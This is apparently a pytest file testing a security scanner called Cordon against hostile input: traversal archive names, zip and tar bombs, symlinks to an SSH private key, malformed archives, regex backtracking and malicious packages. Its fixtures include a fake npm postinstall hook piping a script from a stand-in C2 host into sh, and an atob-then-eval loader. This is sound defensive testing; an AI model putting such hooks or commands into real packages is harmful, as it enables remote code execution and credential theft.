"""Hostile input: attacks against the scanner itself.

Cordon is pointed, by design, at code that may be actively malicious, on
machines holding production credentials. From its perspective a decompression
bomb, a symlink to a private key and a pattern crafted to backtrack are all
ordinary inputs.

Every test here feeds the scanner something built to break it and asserts three
things: it terminates, it stays within its limits, and it *says* what it
refused. The third matters as much as the first two. An archive that was
rejected and an archive that was clean must never look alike in the output.

The samples are constructed in code rather than committed as files. A real zip
bomb in the repository would be flagged by every other scanner an adopter runs,
and shipping one in a security tool's own tree is a poor way to build trust.
"""

from __future__ import annotations

import io
import sys
import tarfile
import time
import zipfile

import pytest

from cordon_scanner import Scanner
from cordon_scanner.archive.safe import ArchiveReader, Rejection
from cordon_scanner.core.config import Config
from cordon_scanner.core.content import FileContent
from cordon_scanner.core.errors import ArchiveError
from cordon_scanner.core.limits import DEFAULT_LIMITS
from cordon_scanner.core.models import Category, Severity
from support import assemble

pytestmark = pytest.mark.hostile


# ---------------------------------------------------------------------------
# Member names
# ---------------------------------------------------------------------------


class TestMemberNameSafety:
    @pytest.mark.parametrize(
        "name",
        [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "/absolute/path",
            "C:\\Windows\\System32",
            "a/../../../outside",
            "./../../escape",
            "with\x00nul",
            "",
            "..",
        ],
    )
    def test_unsafe_names_are_refused(self, name: str) -> None:
        """The check runs on the normalised form, so `a/../../b` is caught even
        though no single component looks wrong."""
        assert ArchiveReader.safe_member_name(name) is None

    @pytest.mark.parametrize(
        ("name", "expected"),
        [
            ("src/app.py", "src/app.py"),
            ("./src/app.py", "src/app.py"),
            ("a/b/../b/c.txt", None),
            ("package/lib/index.js", "package/lib/index.js"),
        ],
    )
    def test_ordinary_names_are_preserved(self, name: str, expected: str | None) -> None:
        assert ArchiveReader.safe_member_name(name) == expected


# ---------------------------------------------------------------------------
# Decompression bombs
# ---------------------------------------------------------------------------


def zip_of(members: dict[str, bytes], *, compress: bool = True) -> bytes:
    buffer = io.BytesIO()
    mode = zipfile.ZIP_DEFLATED if compress else zipfile.ZIP_STORED
    with zipfile.ZipFile(buffer, "w", mode) as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def tar_of(members: dict[str, bytes], *, compression: str = "gz") -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode=f"w:{compression}") as archive:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


class TestDecompressionBombs:
    def test_high_ratio_member_is_refused(self) -> None:
        """A hugely compressible member is the classic bomb. The ratio ceiling
        must stop it while it streams, not after it has been materialised."""
        bomb = zip_of({"bomb.txt": b"\x00" * (8 * 1024 * 1024)})
        limits = DEFAULT_LIMITS.merged(max_archive_ratio=10, max_file_bytes=64 * 1024 * 1024)

        result = ArchiveReader.extract(bomb, path="bomb.zip", limits=limits)

        assert not result.members, "the bomb member must not be returned"
        assert any(r.reason == Rejection.RATIO for r in result.rejected)

    def test_rejection_is_reported_not_silent(self) -> None:
        """An archive that was refused and one that was clean must never look
        alike in the output."""
        bomb = zip_of({"bomb.txt": b"\x00" * (4 * 1024 * 1024)})
        result = ArchiveReader.extract(
            bomb, path="bomb.zip", limits=DEFAULT_LIMITS.merged(max_archive_ratio=10)
        )
        assert result.rejected
        assert result.rejected[0].detail, "a rejection must explain itself"

    def test_oversized_member_is_refused(self) -> None:
        data = zip_of({"big.bin": b"A" * 200_000}, compress=False)
        result = ArchiveReader.extract(
            data, path="a.zip", limits=DEFAULT_LIMITS.merged(max_file_bytes=1000)
        )
        assert not result.members
        assert any(r.reason == Rejection.SIZE for r in result.rejected)

    def test_total_budget_is_enforced_across_members(self) -> None:
        members = {f"f{i}.bin": b"B" * 50_000 for i in range(20)}
        result = ArchiveReader.extract(
            zip_of(members, compress=False),
            path="a.zip",
            limits=DEFAULT_LIMITS.merged(max_uncompressed_bytes=120_000),
        )
        assert result.truncated
        assert result.total_uncompressed <= 200_000

    def test_entry_count_is_capped(self) -> None:
        members = {f"f{i}.txt": b"x" for i in range(500)}
        with pytest.raises(ArchiveError, match="entries"):
            ArchiveReader.extract(
                zip_of(members),
                path="many.zip",
                limits=DEFAULT_LIMITS.merged(max_archive_entries=100),
            )

    def test_compressed_tar_bomb_is_caught_by_aggregate_ratio(self) -> None:
        """A compressed tar reports no per-member compressed size, so the
        per-member ceiling cannot apply. The aggregate ratio catches it."""
        bomb = tar_of({"bomb.txt": b"\x00" * (8 * 1024 * 1024)})
        with pytest.raises(ArchiveError, match="expands"):
            ArchiveReader.extract(
                bomb,
                path="bomb.tar.gz",
                limits=DEFAULT_LIMITS.merged(max_archive_ratio=10, max_file_bytes=64 * 1024 * 1024),
            )


# ---------------------------------------------------------------------------
# Traversal, links and nesting
# ---------------------------------------------------------------------------


class TestTraversalAndLinks:
    def test_traversing_member_is_refused(self) -> None:
        result = ArchiveReader.extract(zip_of({"../../etc/cron.d/evil": b"payload"}), path="a.zip")
        assert not result.members
        assert result.rejected[0].reason == Rejection.TRAVERSAL

    def test_symlink_member_is_never_extracted(self) -> None:
        """Following one is how an extractor is made to read a private key
        outside its own directory and then report it as evidence."""
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w") as archive:
            link = tarfile.TarInfo("innocent.py")
            link.type = tarfile.SYMTYPE
            link.linkname = "/root/.ssh/id_rsa"
            archive.addfile(link)

        result = ArchiveReader.extract(buffer.getvalue(), path="a.tar")
        assert not result.members
        assert result.rejected[0].reason == Rejection.LINK

    def test_special_files_are_refused(self) -> None:
        """A device node or FIFO can block a reader indefinitely."""
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w") as archive:
            fifo = tarfile.TarInfo("pipe")
            fifo.type = tarfile.FIFOTYPE
            archive.addfile(fifo)

        result = ArchiveReader.extract(buffer.getvalue(), path="a.tar")
        assert not result.members
        assert result.rejected[0].reason == Rejection.SPECIAL

    def test_nesting_depth_is_bounded(self) -> None:
        """Nothing legitimate nests this deep, so the nesting is the signal."""
        payload = zip_of({"inner.txt": b"deep"})
        for _ in range(6):
            payload = zip_of({"nested.zip": payload})

        limits = DEFAULT_LIMITS.merged(max_archive_depth=2)
        found = list(ArchiveReader.walk_archive(payload, path="outer.zip", limits=limits))
        # Extraction stops rather than recursing without bound.
        assert len(found) < 10

    def test_nested_archive_members_carry_their_full_path(self) -> None:
        """A finding inside a wheel inside a tarball must still say where it
        lives."""
        inner = zip_of({"lib/app.js": b"console.log(1)"})
        outer = zip_of({"bundle.zip": inner})
        paths = [p for p, _ in ArchiveReader.walk_archive(outer, path="outer.zip")]
        assert any("!bundle.zip!lib/app.js" in p for p in paths)


# ---------------------------------------------------------------------------
# Malformed input
# ---------------------------------------------------------------------------


class TestMalformedInput:
    @pytest.mark.parametrize(
        "data",
        [
            b"",
            b"not an archive at all",
            b"PK\x03\x04truncated",
            b"\x1f\x8b\x08" + b"\x00" * 10,
            bytes(range(256)),
        ],
    )
    def test_garbage_raises_a_typed_error_not_a_crash(self, data: bytes) -> None:
        with pytest.raises(ArchiveError):
            ArchiveReader.extract(data, path="junk.zip")

    def test_truncated_zip_central_directory(self) -> None:
        valid = zip_of({"a.txt": b"hello"})
        with pytest.raises(ArchiveError):
            ArchiveReader.extract(valid[: len(valid) // 2], path="truncated.zip")


# ---------------------------------------------------------------------------
# Content-level hostility
# ---------------------------------------------------------------------------


class TestHostileFileContent:
    def test_one_gigantic_line_does_not_exhaust_memory(self) -> None:
        content = FileContent.from_bytes("huge.js", b"x" * (2 * 1024 * 1024))
        # The bound applies when a line is materialised, not when it is measured.
        assert content.longest_line == 2 * 1024 * 1024
        assert len(content.line_text(1)) <= DEFAULT_LIMITS.max_line_bytes

    def test_invalid_utf8_is_decoded_not_refused(self) -> None:
        content = FileContent.from_bytes("x.py", b"\xff\xfe\xfd valid text \xc3\x28")
        assert "valid text" in content.text

    def test_deeply_nested_json_does_not_recurse_without_bound(self, tmp_path) -> None:
        """A hostile manifest is still a manifest. The parser must refuse it
        rather than exhaust the stack."""
        nested = "[" * 200 + "]" * 200
        (tmp_path / "package.json").write_text(
            f'{{"name":"x","dependencies":{nested}}}', encoding="utf-8"
        )
        result = Scanner(Config.default()).scan(tmp_path)
        assert result is not None  # terminated

    def test_scan_of_hostile_tree_terminates_and_reports(self, tmp_path) -> None:
        (tmp_path / "deep").mkdir()
        current = tmp_path / "deep"
        for i in range(60):
            current = current / f"d{i}"
            current.mkdir()
        (current / "app.js").write_text("console.log(1)", encoding="utf-8")

        started = time.monotonic()
        result = Scanner(Config.default()).scan(tmp_path)
        assert time.monotonic() - started < 30

        # Depth was bounded, so the deepest file is out of reach. That must be
        # visible in the result rather than resembling an empty directory.
        assert result is not None

    @pytest.mark.skipif(sys.platform == "win32", reason="symlink semantics differ")
    def test_symlink_to_a_secret_is_never_read(self, tmp_path) -> None:
        """The end-to-end version of the traversal defence."""
        # Assembled rather than written literally. Cordon scans its own
        # repository in CI, and a private-key header committed here would be a
        # true positive: the tool should not need an exception for itself.
        marker = assemble("-----BEGIN ", "PRIVATE KEY", "-----")
        canary = assemble("SENTINELVALUE", "0123456789")
        secret = tmp_path / "outside.key"
        secret.write_text(f"{marker}\n{canary}\n", encoding="utf-8")

        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "config.js").symlink_to(secret)

        result = Scanner(Config.default()).scan(repo)

        for finding in result.findings:
            snippet = finding.evidence.snippet or ""
            assert marker not in snippet
            assert canary not in snippet

        # And the link is reported, so the file is not silently absent.
        assert any(
            f.category is Category.OPERATIONAL and "ymbolic" in f.message for f in result.findings
        )

    def test_timeout_produces_a_partial_result_not_a_crash(self, tmp_path) -> None:
        """A partial result a human can act on beats a stack trace, and marking
        it partial is what stops it being read as a pass."""
        for i in range(50):
            (tmp_path / f"f{i}.js").write_text("const x = 1;\n" * 100, encoding="utf-8")

        config = Config.default()
        config = config.with_overrides(limits=config.limits.merged(total_timeout=0.0))
        result = Scanner(config).scan(tmp_path)

        assert result.complete is False
        assert any(f.rule_id == "OPERATIONAL.SCAN.TIMEOUT" for f in result.findings), (
            "a timed-out scan must say so"
        )


# ---------------------------------------------------------------------------
# Pattern safety
# ---------------------------------------------------------------------------


class TestRegexSafety:
    def test_crafted_input_does_not_hang_the_built_in_rules(self) -> None:
        """Every shipped pattern is run against input designed to maximise
        backtracking. The bound is wall-clock, because that is the property
        that actually matters."""
        from cordon_scanner.rules.loader import RuleLoader

        adversarial = [
            b"a" * 5000,
            b"(" * 2000,
            b"eval(" * 1000,
            b"\\x41" * 2000,
            (b"process.env" + b" " * 100) * 200,
            b"'" * 5000,
            bytes(range(256)) * 40,
        ]

        for pack in RuleLoader.load_builtin():
            for compiled in pack:
                if compiled.match.regex is None:
                    continue
                for payload in adversarial:
                    started = time.monotonic()
                    compiled.match.regex.search(payload)
                    elapsed = time.monotonic() - started
                    assert elapsed < 1.0, f"{compiled.id} took {elapsed:.2f}s on adversarial input"


# ---------------------------------------------------------------------------
# Scanning an archive end to end
# ---------------------------------------------------------------------------


class TestArchiveScanning:
    """`cordon scan package.tgz` is how a package is inspected before it is
    trusted, so it has to work on hostile archives as well as well-formed ones.
    """

    def package(self, tmp_path, members: dict[str, bytes], name: str = "pkg.tgz"):
        path = tmp_path / name
        path.write_bytes(tar_of(members))
        return path

    def test_a_malicious_package_is_detected(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        archive = self.package(
            tmp_path,
            {
                "package/package.json": (
                    b'{"name":"evil","version":"1.0.0","scripts":'
                    b'{"postinstall":"curl -s https://c2.example.net/i.sh | sh"}}'
                ),
                "package/index.js": b"module.exports = 1;\n",
            },
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        assert any(f.category is Category.MALICIOUS for f in result.findings)

    def test_findings_carry_the_path_inside_the_archive(self, tmp_path) -> None:
        """A finding that says only "somewhere in this tarball" is not
        actionable."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        archive = self.package(tmp_path, {"package/loader.js": b"const p = atob(B);\neval(p);\n"})
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        assert result.findings
        assert any("!package/loader.js" in f.location.path for f in result.findings)

    def test_a_clean_package_produces_nothing(self, tmp_path) -> None:
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        archive = self.package(
            tmp_path,
            {
                "package/package.json": b'{"name":"ok","version":"1.0.0"}',
                "package/index.js": b"export const add = (a, b) => a + b;\n",
            },
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        noisy = [
            f
            for f in result.findings
            if f.category is not Category.OPERATIONAL and f.severity > Severity.LOW
        ]
        assert not noisy, [f.rule_id for f in noisy]

    def test_a_refused_archive_is_reported_not_silently_clean(self, tmp_path) -> None:
        """The rule the whole engine follows: an archive that was refused and
        one that was clean must never look alike."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        broken = tmp_path / "broken.tgz"
        broken.write_bytes(b"this is not an archive at all")

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(broken)
        assert result.complete is False
        assert any(f.rule_id == "OPERATIONAL.ARCHIVE.REJECTED" for f in result.findings)

    def test_nothing_is_written_to_disk(self, tmp_path) -> None:
        """Members are held in memory and never materialised. Nothing that was
        never written can be executed, followed, or left behind by a crash."""
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        archive = self.package(tmp_path, {"package/a.js": b"const x = 1;\n"}, name="only.tgz")
        before = {p.name for p in tmp_path.iterdir()}
        Scanner(Config.default().with_overrides(use_cache=False)).scan(archive)
        assert {p.name for p in tmp_path.iterdir()} == before
